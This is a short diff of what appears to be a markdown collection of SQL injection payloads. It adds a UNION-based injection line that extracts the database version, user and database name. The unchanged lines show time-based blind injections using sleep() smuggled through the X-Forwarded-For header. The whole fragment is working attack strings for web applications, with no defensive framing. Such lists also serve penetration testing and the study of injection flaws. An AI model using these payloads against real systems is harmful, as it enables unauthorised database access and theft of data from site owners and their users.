@@ -8,6 +8,8 @@ ___
 
 ### Examples
 ```sql
+' and 1=2 union all select concat_ws(0x3a,version(),user(),database()) --
+
 X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers ✔
 
 X-Forwarded-For: 127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1 ✔
